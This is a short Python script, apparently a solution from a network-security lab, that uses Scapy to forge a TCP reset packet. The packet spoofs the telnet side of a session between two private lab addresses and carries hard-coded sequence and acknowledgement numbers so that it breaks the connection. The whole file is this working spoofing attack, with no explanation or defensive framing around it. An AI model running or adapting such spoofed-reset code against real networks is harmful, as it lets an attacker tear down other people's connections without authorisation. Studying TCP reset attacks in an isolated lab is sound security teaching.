#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=23, dport=36538, flags="R", seq=2482079494, ack=4103990137)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
